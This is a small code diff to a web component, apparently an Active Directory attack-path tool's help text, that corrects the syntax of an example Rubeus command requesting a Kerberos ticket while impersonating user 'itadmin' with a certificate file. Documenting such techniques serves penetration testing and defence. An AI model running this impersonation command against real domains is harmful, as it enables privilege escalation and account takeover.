@@ -87,7 +87,7 @@ const WindowsAbuse: FC = () => {
                 impersonate and the PFX-formatted certificate created in Step 4.
             </Typography>
             <Typography component={'pre'}>
-                {'Rubeus.exe asktgt /user:CORP\\itadmin /certificate:itadminenrollment.pfx'}
+                {'Rubeus.exe asktgt /user:itadmin /domain:corp.local /certificate:itadminenrollment.pfx'}
             </Typography>
         </>
     );
